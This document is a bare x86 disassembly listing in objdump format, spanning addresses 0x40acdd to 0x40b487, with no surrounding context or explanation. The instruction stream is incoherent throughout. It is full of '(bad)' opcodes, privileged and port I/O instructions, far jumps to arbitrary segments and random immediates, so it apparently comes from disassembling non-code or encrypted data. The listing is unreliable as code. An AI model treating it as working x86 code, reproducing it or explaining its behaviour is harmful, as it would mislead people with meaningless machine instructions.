  40acdd:	and    BYTE PTR [edi+0x1a],al
  40ace0:	mov    dl,0x7d
  40ace2:	push   ecx
  40ace3:	outs   dx,BYTE PTR ds:[esi]
  40ace4:	cmp    bh,0x5a
  40ace7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ace8:	cmp    esp,DWORD PTR [ebx]
  40acea:	and    cl,BYTE PTR [ebx+0x68a2debc]
  40acf0:	dec    edx
  40acf1:	jb     0x40ad15
  40acf3:	imul   esi,DWORD PTR [edx+0x5e9a8d50],0xfc158614
  40acfd:	add    cl,0xba
  40ad00:	xchg   ebx,eax
  40ad01:	pop    edi
  40ad02:	cmp    BYTE PTR [edi+eax*4-0x5912fd1d],ah
  40ad09:	xchg   esp,eax
  40ad0a:	ins    DWORD PTR es:[edi],dx
  40ad0b:	into   
  40ad0c:	ror    DWORD PTR [esi+ecx*2-0x5c9ebc5f],1
  40ad13:	inc    edi
  40ad14:	jmp    0x40ad4b
  40ad16:	xlat   BYTE PTR ds:[ebx]
  40ad17:	dec    ebp
  40ad18:	shl    al,1
  40ad1a:	in     eax,dx
  40ad1b:	es popa 
  40ad1d:	mov    bh,0x3f
  40ad1f:	pop    es
  40ad20:	push   0xb
  40ad22:	jecxz  0x40ad88
  40ad24:	add    BYTE PTR [edi*8+0x1226ef2e],al
  40ad2b:	outs   dx,BYTE PTR ds:[esi]
  40ad2c:	fiadd  DWORD PTR [eax]
  40ad2e:	pop    es
  40ad2f:	pop    ds
  40ad30:	ja     0x40ad74
  40ad32:	shl    DWORD PTR [ebp+edx*2-0x5606ddc3],cl
  40ad39:	imul   esp,ecx,0x35
  40ad3c:	and    eax,0xbf219958
  40ad41:	out    0x37,al
  40ad43:	push   ds
  40ad44:	fcom   QWORD PTR [edi+0x26]
  40ad47:	cmp    al,0x5b
  40ad49:	mov    ah,0x12
  40ad4b:	jp     0x40ad9b
  40ad4d:	xor    DWORD PTR fs:[ebp-0x71113edb],esp
  40ad54:	cli    
  40ad55:	xchg   edi,esi
  40ad57:	mov    al,ds:0x5ddb911
  40ad5c:	mov    ds:0x42ab53d5,eax
  40ad61:	adc    al,0xd8
  40ad63:	std    
  40ad64:	imul   ebp,edx,0xf3000de1
  40ad6a:	inc    ebp
  40ad6b:	xor    eax,0x5985caf
  40ad70:	or     eax,0xad464217
  40ad75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad76:	dec    ecx
  40ad77:	sbb    ebx,DWORD PTR [eax-0x3]
  40ad7a:	hlt    
  40ad7b:	(bad)  
  40ad7c:	aaa    
  40ad7d:	stc    
  40ad7e:	or     al,0x6f
  40ad80:	aad    0x16
  40ad82:	or     ah,ch
  40ad84:	adc    bh,BYTE PTR [edi]
  40ad86:	sti    
  40ad87:	in     eax,0xe3
  40ad89:	pop    edx
  40ad8a:	daa    
  40ad8b:	(bad)  
  40ad8c:	push   edx
  40ad8d:	mov    ebx,0xb79a0df5
  40ad92:	js     0x40ad97
  40ad94:	pop    ds
  40ad95:	xchg   BYTE PTR [edx+0x6ecef8c5],cl
  40ad9b:	nop
  40ad9c:	inc    eax
  40ad9d:	int3   
  40ad9e:	push   edx
  40ad9f:	loop   0x40ae0a
  40ada1:	test   DWORD PTR [esi+0x1e74ef8e],0xbc6b454
  40adab:	pop    esi
  40adac:	inc    ebx
  40adad:	ja     0x40ad3e
  40adaf:	fisubr WORD PTR [ebp+0x2aa01477]
  40adb5:	imul   eax,DWORD PTR [edi-0x2c],0xd839e170
  40adbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adbd:	loopne 0x40ade7
  40adbf:	stos   DWORD PTR es:[edi],eax
  40adc0:	sub    BYTE PTR [eax-0x74627b63],dl
  40adc6:	iret   
  40adc7:	lods   eax,DWORD PTR ds:[esi]
  40adc8:	add    DWORD PTR [ebp-0x35],esp
  40adcb:	push   0xffffff82
  40adcd:	shr    DWORD PTR [ecx+0x0],cl
  40add0:	pop    esi
  40add1:	push   ss
  40add2:	pop    edi
  40add3:	xchg   esp,eax
  40add4:	mov    dh,0xe9
  40add6:	icebp  
  40add7:	pop    eax
  40add8:	loop   0x40adfa
  40adda:	scas   eax,DWORD PTR es:[edi]
  40addb:	mov    ecx,0xddcedf82
  40ade0:	test   BYTE PTR [ecx+0x2b5b7a8b],al
  40ade6:	xor    ebx,ebx
  40ade8:	fucom  st(4)
  40adea:	iret   
  40adeb:	jmp    0x1b13:0x80633bdc
  40adf2:	xchg   edx,eax
  40adf3:	loop   0x40ae63
  40adf5:	push   edx
  40adf6:	pop    edi
  40adf7:	push   0x6aa70b49
  40adfc:	ret    
  40adfd:	pop    edi
  40adfe:	or     al,0x9
  40ae00:	push   ss
  40ae01:	xor    BYTE PTR [ecx],dl
  40ae03:	mov    eax,DWORD PTR [esi+0xe]
  40ae06:	imul   esp,ecx,0x11d706b5
  40ae0c:	div    DWORD PTR [eax+0x4a]
  40ae0f:	push   esi
  40ae10:	out    dx,al
  40ae11:	aad    0x4a
  40ae13:	dec    esi
  40ae14:	pop    ds
  40ae15:	mov    cl,0x2f
  40ae17:	js     0x40ae19
  40ae19:	icebp  
  40ae1a:	xchg   edi,eax
  40ae1b:	push   esp
  40ae1c:	dec    edx
  40ae1d:	cmp    cl,BYTE PTR [esi+eiz*4]
  40ae20:	ret    0xedc
  40ae23:	push   esi
  40ae24:	cmp    eax,0x79ec835c
  40ae29:	fcmovbe st,st(3)
  40ae2b:	jp     0x40adfa
  40ae2d:	repnz repnz mov DWORD PTR [edx],edi
  40ae31:	neg    BYTE PTR [edi-0x54]
  40ae34:	mov    cl,BYTE PTR [esi]
  40ae36:	xchg   DWORD PTR [eax-0x3c],edi
  40ae39:	not    DWORD PTR [edx-0x673221a6]
  40ae3f:	icebp  
  40ae40:	sbb    al,0x9d
  40ae42:	sbb    al,0xef
  40ae44:	pop    edi
  40ae45:	push   edi
  40ae46:	pop    esp
  40ae47:	sbb    eax,0xe15564b3
  40ae4c:	mov    bl,0x1c
  40ae4e:	xchg   BYTE PTR [ebx],bh
  40ae50:	push   esp
  40ae51:	rcl    DWORD PTR [esi],cl
  40ae53:	mov    cl,0xa7
  40ae55:	jne    0x40ade7
  40ae57:	scas   al,BYTE PTR es:[edi]
  40ae58:	jle    0x40ae80
  40ae5a:	adc    ebx,0x49
  40ae5d:	mov    ah,0x12
  40ae5f:	enter  0x6b70,0x45
  40ae63:	xchg   ecx,eax
  40ae64:	mov    gs,edx
  40ae66:	jmp    0x9305:0xa0248f04
  40ae6d:	js     0x40ae5d
  40ae6f:	ficom  DWORD PTR [edi-0x2037f720]
  40ae75:	or     bx,WORD PTR [edx+edx*1-0xe7515ed]
  40ae7d:	add    cl,dl
  40ae7f:	cmp    esp,DWORD PTR [esi]
  40ae81:	aaa    
  40ae82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae83:	push   0x74
  40ae85:	and    eax,0x9c34b033
  40ae8a:	adc    al,0x40
  40ae8c:	sbb    cl,al
  40ae8e:	pop    ss
  40ae8f:	(bad)  
  40ae90:	jmp    esi
  40ae92:	and    DWORD PTR [edx-0x40],esi
  40ae95:	lock cmc 
  40ae97:	mov    bh,0xeb
  40ae99:	inc    ebx
  40ae9a:	out    dx,al
  40ae9b:	sub    bl,0x6c
  40ae9e:	sub    eax,0xb570d822
  40aea3:	or     al,0xd3
  40aea5:	and    DWORD PTR [edi+ebx*4-0x13],ebp
  40aea9:	mov    ebp,0x9cf01666
  40aeae:	push   es
  40aeaf:	mov    ebp,0xdcb8e728
  40aeb4:	dec    edi
  40aeb5:	out    dx,eax
  40aeb6:	adc    DWORD PTR [ecx+0xc],edx
  40aeb9:	xchg   esi,eax
  40aeba:	loop   0x40aefc
  40aebc:	into   
  40aebd:	xchg   ebp,eax
  40aebe:	pop    ss
  40aebf:	sbb    al,0xea
  40aec1:	repnz cmp eax,0xe14d2e2c
  40aec7:	leave  
  40aec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aec9:	adc    DWORD PTR [esi+0x2a],eax
  40aecc:	in     al,dx
  40aecd:	enter  0x370a,0xa6
  40aed1:	and    eax,0x30f528da
  40aed6:	mov    ebx,0xf00b1d03
  40aedb:	mov    eax,?
  40aedd:	popa   
  40aede:	test   al,0x23
  40aee0:	sahf   
  40aee1:	hlt    
  40aee2:	xor    BYTE PTR [edx+0x41],cl
  40aee5:	sbb    eax,0x9b27c11a
  40aeea:	lahf   
  40aeeb:	xchg   ecx,eax
  40aeec:	cmp    dh,BYTE PTR [esp+ecx*8-0x7cbfe566]
  40aef3:	les    ecx,FWORD PTR [esi]
  40aef5:	mov    BYTE PTR [ebx-0x78e03634],0x23
  40aefc:	push   cs
  40aefd:	dec    eax
  40aefe:	cmp    BYTE PTR [ecx],ah
  40af00:	push   cs
  40af01:	sti    
  40af02:	fs js  0x40af14
  40af05:	xchg   edi,eax
  40af06:	mov    dh,BYTE PTR [eax+0x29]
  40af09:	popa   
  40af0a:	dec    edx
  40af0b:	sub    eax,DWORD PTR [edi-0x42]
  40af0e:	push   ecx
  40af0f:	outs   dx,DWORD PTR ds:[esi]
  40af10:	lods   eax,DWORD PTR ds:[esi]
  40af11:	int3   
  40af12:	jg     0x40af5d
  40af14:	jb     0x40af54
  40af16:	or     eax,0x22b2a9c
  40af1b:	mov    WORD PTR [edi+edx*1-0x1d],gs
  40af1f:	addr16 neg ch
  40af22:	pop    ds
  40af23:	leave  
  40af24:	lock and al,0xec
  40af27:	and    al,bh
  40af29:	ror    BYTE PTR [esi+0x4958e19d],0xc7
  40af30:	fisttp DWORD PTR [ebx-0x53cc5932]
  40af36:	mov    al,0xdc
  40af38:	lods   eax,DWORD PTR ds:[esi]
  40af39:	gs jno 0x40aee6
  40af3c:	inc    ebx
  40af3d:	jmp    0xfc632f18
  40af42:	pop    ds
  40af43:	jns    0x40af3e
  40af45:	ss out dx,eax
  40af47:	into   
  40af48:	mov    esp,0xdf4413a8
  40af4d:	ja     0x40afbc
  40af4f:	ss mov edx,0x9787ff9f
  40af55:	mov    DWORD PTR [eax],edi
  40af57:	loop   0x40afd7
  40af59:	push   0x11
  40af5b:	jae    0x40af59
  40af5d:	mov    ds:0xa7712f44,al
  40af62:	enter  0x6150,0x9
  40af66:	loope  0x40af8d
  40af68:	adc    eax,0x76b63408
  40af6d:	outs   dx,DWORD PTR ds:[esi]
  40af6e:	xor    al,0xe5
  40af70:	test   BYTE PTR [esi],0xcc
  40af73:	adc    al,0x42
  40af75:	jo     0x40afd8
  40af77:	or     al,0x5d
  40af79:	pop    ecx
  40af7a:	mov    esp,0xa0088266
  40af7f:	out    0xa0,eax
  40af81:	and    DWORD PTR [ecx+edi*2-0x213bda94],0x9dc23dab
  40af8c:	push   ebx
  40af8d:	sar    DWORD PTR [edx],cl
  40af8f:	mov    ah,0xd7
  40af91:	mov    al,ds:0x2237d5e0
  40af96:	cmp    BYTE PTR [ebp-0x7d5e6806],ch
  40af9c:	fidivr WORD PTR [edi+0xe]
  40af9f:	sahf   
  40afa0:	adc    bh,BYTE PTR [ebx-0x3133d84c]
  40afa6:	push   es
  40afa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afa8:	mov    cl,0x72
  40afaa:	inc    ebx
  40afab:	jbe    0x40afc3
  40afad:	mov    edx,0x689fce8f
  40afb2:	retf   0x1ca3
  40afb5:	pop    ebx
  40afb6:	dec    ebp
  40afb7:	and    ch,BYTE PTR [ebx]
  40afb9:	jge    0x40af62
  40afbb:	stos   DWORD PTR es:[edi],eax
  40afbc:	and    eax,0xaa4cb891
  40afc1:	out    dx,eax
  40afc2:	and    eax,DWORD PTR [edx+ecx*4-0x65fe17ea]
  40afc9:	mov    eax,DWORD PTR [edx]
  40afcb:	and    al,0xd6
  40afcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afce:	push   0x10
  40afd0:	add    al,0x72
  40afd2:	out    dx,eax
  40afd3:	dec    edi
  40afd4:	jge    0x40b003
  40afd6:	cli    
  40afd7:	ds add ah,al
  40afda:	jmp    0x8723:0x176ae07c
  40afe1:	jmp    0x40af75
  40afe3:	call   0x65163e02
  40afe8:	mov    ebp,0xfad08d84
  40afed:	mov    al,ds:0x59304b7a
  40aff2:	jp     0x40b036
  40aff4:	xor    DWORD PTR [ebx+0x649e6af1],0xffffffc4
  40affb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40affc:	je     0x40afd4
  40affe:	dec    esp
  40afff:	inc    edx
  40b000:	daa    
  40b001:	cmp    BYTE PTR [edx+0x7610d349],bl
  40b007:	bound  esp,QWORD PTR [ebp+0x5f7b092]
  40b00d:	pop    ss
  40b00e:	sub    al,ch
  40b010:	mov    eax,0xb92fd2b5
  40b015:	scas   al,BYTE PTR es:[edi]
  40b016:	mov    bh,0x1f
  40b018:	retf   0xa208
  40b01b:	jp     0x40b069
  40b01d:	mov    edx,0x2d3456c5
  40b022:	inc    eax
  40b023:	cmp    eax,0xe88be5ff
  40b028:	test   cl,ch
  40b02a:	rol    DWORD PTR [ebx+0x62a548b1],1
  40b030:	popa   
  40b031:	cs pusha 
  40b033:	retf   0xa466
  40b036:	inc    eax
  40b037:	les    edx,FWORD PTR [ebp-0x7ece7cbc]
  40b03d:	imul   edx,ecx,0x1
  40b040:	or     BYTE PTR [ecx+eax*2-0x36],cl
  40b044:	div    BYTE PTR [esi]
  40b046:	ret    0x16e5
  40b049:	jp     0x40b0c4
  40b04b:	call   0x6d42:0x4b46745d
  40b052:	retf   0x7b31
  40b055:	aaa    
  40b056:	mov    eax,0x3c750985
  40b05b:	lock mov eax,0x16674fc6
  40b061:	outs   dx,BYTE PTR ds:[esi]
  40b062:	ret    0x6b4b
  40b065:	xchg   BYTE PTR [eax+0x575e9c81],ah
  40b06b:	jb     0x40b077
  40b06d:	adc    DWORD PTR [ebp+edi*1-0x70ea2cda],eax
  40b074:	pop    ss
  40b075:	fstp   TBYTE PTR [edx]
  40b077:	add    eax,0x2495f82a
  40b07c:	jns    0x40b0d2
  40b07e:	(bad)  
  40b07f:	sbb    BYTE PTR [edi+0x6e65a2c6],bl
  40b085:	rcr    BYTE PTR [ebx],1
  40b087:	test   eax,0x837fd66d
  40b08c:	pop    esp
  40b08d:	mov    bl,0x29
  40b08f:	sbb    eax,0x6bc008e
  40b094:	or     ebp,edx
  40b096:	mov    esi,0xe9ec7290
  40b09b:	pop    eax
  40b09c:	js     0x40b0a9
  40b09e:	cmp    al,0xe1
  40b0a0:	sub    dl,0xb9
  40b0a3:	sbb    bh,bh
  40b0a5:	shl    eax,0x6e
  40b0a8:	out    dx,al
  40b0a9:	rcr    dh,0x6a
  40b0ac:	or     edx,DWORD PTR [edx+0x246a72b7]
  40b0b2:	or     ebx,eax
  40b0b4:	sbb    BYTE PTR [eax+esi*8+0x6d4ba51],al
  40b0bb:	push   edx
  40b0bc:	aam    0x1
  40b0be:	call   0x34e3867f
  40b0c3:	jbe    0x40b142
  40b0c5:	fwait
  40b0c6:	pop    esi
  40b0c7:	and    al,0x91
  40b0c9:	mov    ds:0x5cd83cb4,al
  40b0ce:	clc    
  40b0cf:	push   edx
  40b0d0:	and    BYTE PTR [ebx-0x34],ch
  40b0d3:	pop    eax
  40b0d4:	out    0x6d,eax
  40b0d6:	sub    BYTE PTR [eax],al
  40b0d8:	ror    bh,cl
  40b0da:	stos   DWORD PTR es:[edi],eax
  40b0db:	sub    edx,0xf6bf8b66
  40b0e1:	xor    al,0xa2
  40b0e3:	mov    bh,0x38
  40b0e5:	sub    DWORD PTR [eax+0x5c],edx
  40b0e8:	pop    ebx
  40b0e9:	push   0x79288cf6
  40b0ee:	sub    DWORD PTR [esi],esi
  40b0f0:	mul    BYTE PTR [ecx-0x76]
  40b0f3:	pop    esi
  40b0f4:	or     BYTE PTR [edi],dh
  40b0f6:	iret   
  40b0f7:	mov    al,0x7
  40b0f9:	cmp    bl,dh
  40b0fb:	add    dl,BYTE PTR [edi]
  40b0fd:	jmp    0xa7727049
  40b102:	cmp    ch,BYTE PTR [ecx]
  40b104:	mov    ebp,0x37957e3e
  40b109:	jne    0x40b0ed
  40b10b:	(bad)  
  40b10c:	ins    DWORD PTR es:[edi],dx
  40b10d:	cmp    BYTE PTR [eax-0x17],al
  40b110:	sbb    BYTE PTR [ecx],0x1d
  40b113:	popf   
  40b114:	test   eax,0xdff96719
  40b119:	aaa    
  40b11a:	push   ss
  40b11b:	nop    DWORD PTR [edi+ebx*8]
  40b11f:	push   cs
  40b120:	enter  0x380f,0x6d
  40b124:	out    0x6c,eax
  40b126:	cmp    bh,BYTE PTR ds:0x751fb5df
  40b12c:	lahf   
  40b12d:	sbb    BYTE PTR [ebx+0x1f],0x77
  40b131:	sbb    al,0xc4
  40b133:	mov    ebp,0x7796ace4
  40b138:	mov    eax,0x381398f7
  40b13d:	(bad)  
  40b13e:	or     dl,BYTE PTR [edi]
  40b140:	test   DWORD PTR [edi-0x4fc2726f],edx
  40b146:	out    dx,eax
  40b147:	push   ecx
  40b148:	jb     0x40b197
  40b14a:	jno    0x40b12a
  40b14c:	xlat   BYTE PTR ds:[ebx]
  40b14d:	xchg   BYTE PTR [esp+edi*4-0x1cfbaff6],dl
  40b154:	test   eax,0x3aa8baa1
  40b159:	mov    esp,0x3fab79fe
  40b15e:	mov    ds:0x7dc4b9ab,al
  40b163:	scas   al,BYTE PTR es:[edi]
  40b164:	push   ss
  40b165:	mov    ebx,0xc5b2cf83
  40b16a:	imul   edx,DWORD PTR [edx-0x721c1f3],0xffffff84
  40b171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b172:	addr16 test eax,0x966d5588
  40b178:	stos   DWORD PTR es:[edi],eax
  40b179:	adc    al,0x2b
  40b17b:	int3   
  40b17c:	shl    BYTE PTR [eax+0x49],0x16
  40b180:	std    
  40b181:	mov    ch,0xbc
  40b183:	xchg   ecx,eax
  40b184:	mov    WORD PTR [ebx],ss
  40b186:	add    ecx,DWORD PTR [edi-0x54cbcc13]
  40b18c:	push   esp
  40b18d:	div    DWORD PTR [ebx-0x52]
  40b190:	out    dx,al
  40b191:	inc    esp
  40b192:	mov    edx,0xbec7bf03
  40b197:	hlt    
  40b198:	adc    eax,0xc54fc2c6
  40b19d:	seta   BYTE PTR [ebx-0x29567a2c]
  40b1a4:	mov    dl,0x84
  40b1a6:	dec    ecx
  40b1a7:	xchg   DWORD PTR [ecx+0x7eb95898],eax
  40b1ad:	ja     0x40b180
  40b1af:	xor    esp,DWORD PTR [ecx]
  40b1b1:	or     BYTE PTR [eax],0xc3
  40b1b4:	(bad)  
  40b1b5:	mov    esi,0x55d9562d
  40b1ba:	std    
  40b1bb:	dec    ecx
  40b1bc:	scas   eax,DWORD PTR es:[edi]
  40b1bd:	push   ebx
  40b1be:	and    DWORD PTR [ebp-0x71],esi
  40b1c1:	aas    
  40b1c2:	or     ecx,ebx
  40b1c4:	jecxz  0x40b188
  40b1c6:	daa    
  40b1c7:	iret   
  40b1c8:	test   al,0x3d
  40b1ca:	das    
  40b1cb:	into   
  40b1cc:	enter  0x9d77,0x97
  40b1d0:	into   
  40b1d1:	jl     0x40b193
  40b1d3:	add    DWORD PTR [eax],edi
  40b1d5:	sar    al,cl
  40b1d7:	fisub  DWORD PTR [esi+0x43]
  40b1da:	idiv   BYTE PTR [ecx+0x10]
  40b1dd:	(bad)  
  40b1de:	push   0x52
  40b1e0:	xchg   edi,eax
  40b1e1:	jl     0x40b163
  40b1e3:	retf   
  40b1e4:	and    al,0xe9
  40b1e6:	sbb    ah,BYTE PTR [edi+0xb]
  40b1e9:	mov    ch,0xfd
  40b1eb:	mov    bh,0x91
  40b1ed:	mov    eax,ds:0x62bdfce
  40b1f2:	lods   eax,DWORD PTR ds:[esi]
  40b1f4:	jmp    0x1fd3d435
  40b1f9:	clc    
  40b1fa:	inc    ecx
  40b1fb:	in     eax,dx
  40b1fc:	dec    esi
  40b1fd:	xor    bh,ah
  40b1ff:	leave  
  40b200:	mov    DWORD PTR [edi-0x58],eax
  40b203:	and    DWORD PTR [edi],0xffffffd3
  40b206:	mov    ecx,0xd4e15994
  40b20b:	cmp    DWORD PTR [ebx-0x3b33bfa8],edx
  40b211:	inc    esi
  40b212:	cli    
  40b213:	ret    
  40b214:	(bad)  
  40b215:	rol    BYTE PTR [ecx],1
  40b217:	dec    esp
  40b218:	loope  0x40b1a3
  40b21a:	adc    ecx,DWORD PTR [eax+0x56]
  40b21d:	adc    DWORD PTR [ebp-0x7236a9cb],edi
  40b223:	jmp    0x5d0f:0xf37a1bd7
  40b22a:	xchg   edi,eax
  40b22b:	sbb    cl,BYTE PTR [eax-0x54]
  40b22e:	sub    al,BYTE PTR [eax-0x1dd33eca]
  40b234:	aam    0x5
  40b236:	xchg   esi,eax
  40b237:	jp     0x40b1fa
  40b239:	pop    esi
  40b23a:	bound  ebp,QWORD PTR [ebx-0x68]
  40b23d:	retf   
  40b23e:	cwde   
  40b23f:	jge    0x40b23b
  40b241:	jmp    0x5a4e:0xfb79836a
  40b248:	inc    esp
  40b249:	cmp    bl,BYTE PTR [ecx]
  40b24b:	pop    esi
  40b24c:	jo     0x40b1e9
  40b24e:	cmp    eax,0xcd019b2b
  40b253:	mov    ebp,0xd2867d22
  40b258:	fdiv   st(0),st
  40b25a:	ret    
  40b25b:	cmp    BYTE PTR [ebp+0x49936d5a],cl
  40b261:	push   eax
  40b262:	int    0x72
  40b264:	ss jns 0x40b269
  40b267:	cmp    DWORD PTR [ebp-0x67],ecx
  40b26a:	xor    eax,0xc2bf37be
  40b26f:	and    DWORD PTR [edi+0x56670317],ecx
  40b275:	inc    ebp
  40b276:	sbb    DWORD PTR [esi-0x53],eax
  40b279:	and    DWORD PTR [ebx],esp
  40b27b:	mov    ds:0x38f2eb09,eax
  40b280:	push   ebp
  40b281:	inc    esi
  40b282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b283:	pop    esi
  40b284:	out    dx,eax
  40b285:	bswap  esi
  40b287:	pop    ss
  40b288:	es and ch,0x79
  40b28c:	xchg   ecx,eax
  40b28d:	aad    0x36
  40b28f:	push   ebx
  40b290:	push   ds
  40b291:	repnz mov bh,0x46
  40b294:	fnsave [edi+ebx*8+0x35]
  40b298:	adc    al,0x4b
  40b29a:	(bad)  
  40b29b:	sbb    DWORD PTR [edx+0x619d11c6],eax
  40b2a1:	pop    ebx
  40b2a2:	das    
  40b2a3:	cmp    eax,0x32908f0a
  40b2a8:	xchg   esi,eax
  40b2a9:	call   0x6ad5:0xcfbaec84
  40b2b0:	pushf  
  40b2b1:	aaa    
  40b2b2:	xor    BYTE PTR [ecx-0x5b],0x4b
  40b2b6:	add    ch,BYTE PTR [ecx-0x2bc8d2d3]
  40b2bc:	cmp    al,0x85
  40b2be:	pop    esi
  40b2bf:	jge    0x40b30b
  40b2c1:	adc    BYTE PTR [edi],dl
  40b2c3:	cmovb  edx,ebx
  40b2c6:	js     0x40b32a
  40b2c8:	jge    0x40b2a1
  40b2ca:	push   ebp
  40b2cb:	(bad)  
  40b2cc:	mov    esi,0x688b5ad4
  40b2d1:	push   ebp
  40b2d2:	outs   dx,BYTE PTR ds:[esi]
  40b2d3:	into   
  40b2d4:	mov    ds:0x72ca52d6,eax
  40b2d9:	ds pop ebx
  40b2db:	ficom  WORD PTR [edx-0x2e]
  40b2de:	lock cmp edx,ebp
  40b2e1:	loopne 0x40b2d1
  40b2e3:	mul    edx
  40b2e5:	mov    dh,0x4d
  40b2e7:	inc    ebx
  40b2e8:	mov    al,0x91
  40b2ea:	mov    al,0xb
  40b2ec:	dec    ecx
  40b2ed:	lds    edx,FWORD PTR [edx-0x3d]
  40b2f0:	test   eax,0x7c478497
  40b2f5:	arpl   WORD PTR [esi-0x461f96be],di
  40b2fb:	fadd   QWORD PTR [eax-0x67a2af0c]
  40b301:	push   edx
  40b302:	xor    DWORD PTR [esi*1-0x5ad1af43],0xc1f74706
  40b30d:	fist   DWORD PTR [ebp+0x66]
  40b310:	pop    ebp
  40b311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b312:	push   0x7b57115
  40b317:	or     DWORD PTR [ecx+0xc],ebp
  40b31a:	imul   edx,edi,0x6ea6fe4e
  40b320:	push   edi
  40b321:	imul   ebx,DWORD PTR [esi+0x1f],0x94f29575
  40b328:	sbb    DWORD PTR [ecx-0x74],0x5a8dc104
  40b32f:	lock retf 0x23eb
  40b333:	pop    esp
  40b334:	ins    BYTE PTR es:[edi],dx
  40b335:	loope  0x40b2f2
  40b337:	imul   eax,DWORD PTR [eax],0xee2b70aa
  40b33d:	dec    eax
  40b33e:	xor    eax,0x6ed81d8e
  40b343:	ret    
  40b344:	mov    esp,eax
  40b346:	leave  
  40b347:	mov    eax,0x1f15e1a9
  40b34c:	icebp  
  40b34d:	sbb    BYTE PTR [edx+edx*2],cl
  40b350:	push   edx
  40b351:	(bad)  
  40b352:	neg    BYTE PTR [si-0x3951]
  40b357:	and    ebp,edx
  40b359:	es (bad) 
  40b35b:	xchg   esi,eax
  40b35c:	pop    ds
  40b35d:	xor    al,0x50
  40b35f:	and    eax,0xb3dad22c
  40b364:	les    esi,FWORD PTR [edx-0x2d]
  40b367:	mov    ds:0x6cfeecb5,eax
  40b36c:	jle    0x40b380
  40b36e:	fadd   QWORD PTR [eax+0x2add24f9]
  40b374:	mov    dl,0x57
  40b376:	mov    esp,0x9cd59d68
  40b37b:	sub    BYTE PTR [esp+esi*2-0x2c],bl
  40b37f:	ret    0xe88e
  40b382:	pop    esi
  40b383:	mov    eax,0x7b14e2cd
  40b388:	imul   edx,DWORD PTR [edx+0x2f],0xa3d0da3e
  40b38f:	lds    eax,FWORD PTR [edx]
  40b391:	data16 mov dh,0xd3
  40b394:	xor    ecx,DWORD PTR fs:0x526e05ac
  40b39b:	loop   0x40b3d1
  40b39d:	adc    DWORD PTR [ecx+0x19],edx
  40b3a0:	dec    esp
  40b3a1:	cmp    ebp,eax
  40b3a3:	cmc    
  40b3a4:	adc    eax,0xf3b1daec
  40b3a9:	sub    edi,DWORD PTR [esp+edx*2]
  40b3ac:	add    DWORD PTR [esi+esi*1],ebx
  40b3af:	outs   dx,BYTE PTR ds:[esi]
  40b3b0:	and    al,0x82
  40b3b2:	call   0x92d3:0x4e0c6d04
  40b3b9:	sbb    DWORD PTR [ebp-0x306a8fea],esp
  40b3bf:	mov    DWORD PTR [edx],edx
  40b3c1:	sbb    al,0xb9
  40b3c3:	add    bl,BYTE PTR [ebx+ebx*1-0xf]
  40b3c7:	iret   
  40b3c8:	ror    DWORD PTR [eax],1
  40b3ca:	mov    ebx,0x7abd5bd5
  40b3cf:	lahf   
  40b3d0:	es jmp 0x5147741d
  40b3d6:	push   ebx
  40b3d7:	pop    ebx
  40b3d8:	jnp    0x40b3f1
  40b3da:	mov    al,0xc8
  40b3dc:	out    0x76,al
  40b3de:	stos   BYTE PTR es:[edi],al
  40b3df:	arpl   WORD PTR [ebx],bx
  40b3e1:	scas   eax,DWORD PTR es:[edi]
  40b3e2:	push   edi
  40b3e3:	arpl   dx,ax
  40b3e5:	sahf   
  40b3e6:	adc    edx,DWORD PTR [edi+0x16]
  40b3e9:	add    al,0xe0
  40b3eb:	sbb    eax,0x9dc7b0f0
  40b3f0:	in     eax,0x25
  40b3f2:	fsubrp st(6),st
  40b3f4:	adc    DWORD PTR [edx-0x25dd859],0xffffff93
  40b3fb:	iret   
  40b3fc:	in     eax,0x7
  40b3fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ff:	mov    al,0x43
  40b401:	xchg   ebp,eax
  40b402:	shr    DWORD PTR [edx-0x7874266],cl
  40b408:	loop   0x40b41e
  40b40a:	pop    DWORD PTR [edx-0x45]
  40b40d:	add    BYTE PTR [esi+0x5744625b],0xe5
  40b414:	popa   
  40b415:	sub    BYTE PTR [ebx-0x27],cl
  40b418:	push   0x13
  40b41a:	or     BYTE PTR [edi+0x51],dl
  40b41d:	scas   al,BYTE PTR es:[edi]
  40b41e:	cwde   
  40b41f:	mov    ch,0x7d
  40b421:	sbb    BYTE PTR ds:0x99ec84c5,al
  40b427:	icebp  
  40b428:	fs es xchg esp,eax
  40b42b:	jae    0x40b4aa
  40b42d:	sbb    eax,0xb6f5f29b
  40b432:	dec    edx
  40b433:	(bad)  [edi+eax*4+0x54]
  40b437:	mov    eax,ds:0xc25eba7b
  40b43c:	int    0xf
  40b43e:	add    ecx,eax
  40b440:	rcl    DWORD PTR [ebp+0x31],1
  40b443:	sub    eax,0xe18f25b3
  40b448:	mov    edi,0xc856cc1f
  40b44d:	pop    ebx
  40b44e:	cli    
  40b44f:	in     eax,dx
  40b450:	inc    edi
  40b451:	jecxz  0x40b3ec
  40b453:	in     eax,dx
  40b454:	xor    ebp,DWORD PTR [edi-0x6]
  40b457:	adc    al,0x90
  40b459:	test   al,0x80
  40b45b:	xor    ebx,DWORD PTR [edi]
  40b45d:	mov    eax,ds:0xeba275d6
  40b462:	addr16 adc bl,ch
  40b465:	das    
  40b466:	dec    eax
  40b467:	aam    0xf2
  40b469:	dec    edx
  40b46a:	stos   BYTE PTR es:[edi],al
  40b46b:	jge    0x40b495
  40b46d:	frstor [eax-0x6b]
  40b470:	xor    bl,al
  40b472:	fistp  DWORD PTR [edi]
  40b474:	jmp    0x40b47c
  40b476:	in     eax,0x42
  40b478:	popf   
  40b479:	xchg   ebp,ecx
  40b47b:	pop    edx
  40b47c:	in     al,0xcf
  40b47e:	imul   ecx,DWORD PTR [ebx+ecx*2+0x67],0xffffffab
  40b483:	cwde   
  40b484:	ret    0x6b75
  40b487:	fdiv   DWORD PTR [eax-0x28b0fca3]
